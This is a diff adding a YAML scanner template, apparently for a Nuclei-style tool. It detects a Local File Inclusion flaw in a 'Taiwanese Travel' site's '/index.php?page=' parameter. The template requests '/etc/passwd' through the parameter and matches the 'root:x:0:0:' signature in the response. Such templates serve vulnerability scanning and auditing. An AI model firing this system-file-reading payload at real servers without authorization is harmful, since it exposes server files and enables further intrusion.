@@ -1,0 +1,28 @@
+id: taiwanese-travel-lfi
+brief:
+    title: Taiwanese Travel - Local File Inclusion
+    by: r3Y3r53
+    level: high
+    about: The vulnerability in '/index.php?page=' allows for Local File Inclusion (LFI), granting attackers the ability to include and potentially execute files on the server, compromising the application's ...
+    label:
+        - lfi
+        - unauth
+        - taiwanese
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php?page=/etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - 'root:x:0:0:'
+          in: body
+        - "on": word
+          has:
+            - travel
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
